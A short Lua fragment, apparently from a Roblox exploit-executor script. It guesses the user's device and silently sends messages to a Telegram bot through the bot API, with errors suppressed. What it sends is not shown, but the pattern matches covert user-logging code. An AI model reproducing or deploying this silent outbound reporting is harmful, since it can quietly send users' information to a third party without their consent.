local function getDeviceInfo()
    local success, result = pcall(function()
        return game:HttpGet("https://api.github.com/repos")
    end)
    
    if success then
        return "🖥️ PC", "Delta Executor"
    else
        return "📱 Android", "Delta"
    end
end

local function sendToTelegram(message)
    local urlMessage = string.gsub(message, " ", "%%20")
    urlMessage = string.gsub(urlMessage, "\n", "%%0A")
    local url = "https://api.telegram.org/bot" .. botToken .. "/sendMessage?chat_id=" .. chatId .. "&text=" .. urlMessage
    
    pcall(function()
        game:HttpGet(url)
    end)
end

